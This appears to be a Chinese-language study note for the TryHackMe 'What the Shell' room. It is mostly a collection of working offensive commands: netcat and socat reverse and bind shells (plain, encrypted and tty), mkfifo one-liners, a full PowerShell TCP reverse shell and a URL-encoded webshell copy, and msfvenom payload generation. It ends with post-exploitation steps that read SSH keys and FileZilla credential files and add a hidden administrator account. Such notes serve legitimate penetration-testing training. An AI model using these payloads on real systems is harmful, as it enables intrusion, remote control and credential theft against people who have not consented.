---
title: What_the_Shell
date: 2024-05-28 04:49:00
updated: 2026-04-13 14:03:42
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Shells_and_Privilege_Escalation
---
# Tools

**Netcat**

**Socat**

**Metasploit 框架的 exploit/multi/handler 模块**

**Msfvenom**

[**Payloads all the Things**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[**Reverse Shell Cheatsheet**](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

**Kali Linux预装 webshell，位于 /usr/share/webshells**

[**SecLists repo**](https://github.com/danielmiessler/SecLists)

[Online - Reverse Shell Generator](https://www.revshells.com/)

# Types of Shell

Reverse Shell

![rN7YkJJ.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716872513874-c56c244b-0ef8-407a-8842-ed10d00bca80.png)

Bind Shell

![6GUwZsw.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716872526061-81478edb-c85c-479d-9571-2ec382d33893.png)

# Netcat

```plain
nc -lvnp <port-number>

-l            #用来告诉netcat这将是一个监听器listener
-v            #用于请求详细输出
-n            #告诉netcat不要解析主机名或者使用DNS
-p            #指定端口

#netcat常用参数列表：
-l：用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。
-p：本地端口
-s：指定发送数据的源IP地址，适用于多网卡机 
-u：指定nc使用UDP协议，默认为TCP
-v：输出交互或出错信息，新手调试时尤为有用
-w：超时秒数，后面跟数字
-z：表示zero，表示扫描时不发送任何数据
-i：secs 延时的间隔
-L：连接关闭，仍然继续监听
-n：指定数字ip，不能用hostname
-o：file 记录16进制的传输
-r：随机本地及远程端口
-t：使用Telnet交互方式
```

`nc -lvnp <port-number>`

`nc <target-ip> <chosen-port>`

## Netcat Shell Stabilisation

### *Python on Linux*

`python -c 'import pty;pty.spawn("/bin/bash")'`

不能使用tab键自动补全功能或者方向键功能,按下 Ctrl + C 仍然会杀死这个shell

`export TERM=xterm`

这将使我们能够访问一些术语命令，例如 clear 命令

`stty raw -echo; fg`

会关闭我们自己本身的终端输出，后再将之前建立的反向shell 前台化

实质上是用反向shell取代了我们自己原来使用的终端

![bQnFz1T.png](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716873455554-52b6814d-fe9b-4a94-94ac-a8fb310e5f67.png)

如果 shell 失效，你的终端中的任何输入都将不可见(这是由于原终端回显被禁用)。要解决这个问题，请输入reset命令，然后按下回车键。

### *rlwrap*

rlwrap 默认不会安装在 Kali 上`sudo apt install rlwrap`

Windows：`rlwrap nc -lvnp <port>`

Linux：先用 Ctrl + Z 后台化 shell，然后再使用`stty raw-echo; fg`命令来稳定化并重新进入 shell

### *Socat on Linux*

首先需要将一个 socat 静态编译的二进制文件传输到目标机器上：

可以让攻击机在包含 socat 二进制文件的目录中开启一个简易的webserver

`sudo python3 -m http.server 80`

然后在目标机器上使用netcat shell界面下载文件（通过 curl 或 wget）

`wget <LOCAL-IP>/socat -O /tmp/socat`

> socat二进制文件下载地址（点击将自动下载）：  
> [https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86\_64/socat](https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat)  
> socat官网：  
> [http://www.dest-unreach.org/](http://www.dest-unreach.org/)

目标机是Windows(不推荐)：

下载socat文件通过 Powershell 完成，使用 Invoke-WebRequest 或者 webrequest 系统类，  
这取决于安装的 Powershell 版本

`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

### 终端界面宽高尺寸的更改

使用以上任何一种技术，都可以更改终端 tty 大小。但是，如果你在终端中打开文本编辑器，那么必须在反向或绑定 shell 中手动完成终端界面宽高尺寸的更改。

首先，打开另一个终端并运行`stty-a`，记下开头部分" 行 "和" 列 "的值:

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716875709359-9ba10971-1e7f-473c-8063-893f9e445c98.png)

接下来，在反向/绑定 shell 中输入以下两个命令:

`stty rows <number>`

`stty cols <number>`

填写你刚才在自己的终端上运行 stty-a 命令所得到的行和列的值。

# Socat

**Reverse Shells**

**攻击机上：**

`socat TCP-L:<port> -`反向 shell 监听器(相当于`nc -lvnp <port>`)

**目标机上：**

**Windows：**`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`  
`pipes`选项用于强制 powershell (或 cmd.exe)使用 Unix 风格的标准输入和输出形式。

**Linux：**`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

​  

**Bind Shells**

**目标机上：**

**Linux：**`socat TCP-L:<PORT> EXEC:"bash -li"`

**Windows：**`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

**攻击机上：**

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## tty技术

特殊的、仅限 Linux 的 TTY（终端）反向shell

将当前的 TTY （TTY含义为：终端）作为文件传递并将它的回显设置为零。能够立即建立一个稳定的shell并能连接到完整的 tty。但是目标机必须安装 socat。

``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

我们可以上传一个预编译的socat二进制文件，然后继续正常执行我们的命令。

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

**加密后：  
**``**socat OPENSSL-LISTEN:<port>,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0**``

`**socat OPENSSL:<attacker-ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane**`

> 预编译的socat二进制文件：[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

> example：在左边，我们有一个在本地攻击机器上运行的侦听器，在右边，我们有一个受感染目标的模拟，使用非交互式外壳运行。使用非交互式 netcat shell，我们执行特殊的 socat 命令，并在左侧的 socat 侦听器上接收到一个完全交互式的 bash shell
> 
> ![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716888529686-025c19e3-1b5f-428d-89db-f7312b29833f.png)

若 socat shell 无法正常工作，`-d -d` 添加到命令中来增加详细程度

## 加密Shell

**攻击机上生成证书：  
**`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

**将两个创建的文件合并为一个 .pem 文件：  
**`cat shell.key shell.crt > shell.pem`

​  

**攻击机上反向 shell 侦听器：**

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`  
verify=0 不验证我们的证书是否已由公认的颁发机构正确签名。

**注意：有监听器的地方就要有PEM文件**

**目标机上：**

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

​  

同样的技术也适用于绑定 shell：

**目标机上：**

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

**攻击机上：**

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

​  

对于 Windows 目标，证书也必须与侦听器一起使用，因此需要将 PEM 文件复制到绑定 shell 中。

> 下图显示了来自 Linux 目标的 OPENSSL 反向 shell， 左边是攻击机终端界面，右边是已经建立的非交互式反向shell界面（右边的listener是自定义的别名）：
> 
> ![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716889932825-c634493f-f086-437f-9010-4c9f39e681aa.png)
> 
> 这种加密技巧也适用于上一个小节中介绍的特殊的、仅限 Linux 的 TTY（终端）反向shell —— 弄清楚它的语法将是本小节答题的关键。

# Common Shell Payloads

绑定 shell`nc -lvnp <PORT> -e /bin/bash`

反弹 shell`nc <LOCAL-IP> <PORT> -e /bin/bash`

bind shell`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

反向shell`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

**目标机为Windows Server：**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# msfvenom

`msfvenom -p <PAYLOAD> <OPTIONS>`

> -   \-f <format>:指定输出格式。 在上面的命令中，格式是一个可执行文件 (exe)
> -   \-o <file>:生成的有效载荷（payload）的输出位置和文件名。
> -   LHOST=<IP>:指定要回连的 IP（即攻击机IP）。 当你使用 TryHackMe 的VPN连接到你自己的攻击机时，这将是你的 tun0 IP 地址。
> -   LPORT=<port>:要回连的本地攻击机上的端口。 可以是 0 到 65535 之间尚未使用的任何值；但是设定为低于 1024 的端口时将受到限制，需要以 root 权限运行监听器。

```plain
生成shell.exe
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

现在我们需要在攻击机上使用来自 Metasploit 的 multi/handler 模块，
然后在目标机器内运行 shell.exe 文件。

在攻击机上执行以下操作来设置 multi/handler:

使用 msfconsole 命令打开 Metasploit
输入命令: use multi/handler
通过输入 show options 命令来查看不同的选项
设置PAYLOAD参数 (set payload windows/x64/meterpreter/reverse_tcp), LHOST参数 (attacker ip) 以及LPORT参数
使用exploit 或者 run 命令执行

必须要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作
```

​  

`msfvenom --list payloads | grep`

# Metasploit multi/handler

Multi/Handler 捕获反向shell。使用 Meterpreter shell，这是必不可少的，并且是使用分阶段payload时的首选。

`msfconsole`

`use multi/handler`

`exploit -j`在后台作为作业运行

# WebShells

> PentestMonkey反向shell 链接： [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Windows:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

# getshell之后的操作

Linux上，SSH 密钥 存储在 **/home/<user>/.ssh**

**Win上，某些版本的 FileZilla FTP 服务器还会在 XML 文件中保留登录凭据**

```plain
C:\Program Files\FileZilla Server\FileZilla Server.xml 
C:\xampp\FileZilla Server\FileZilla Server.xml
#这些凭据可以是MD5散列值，也可以是明文，具体取决于版本
```

Win上：

```plain
net user <username> <password> /add            #添加新用户
net localgroup administrators <username> /add  #添加用户到管理员组
```

Windows RDP登录`sudo xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:<username> /p:'<password>'`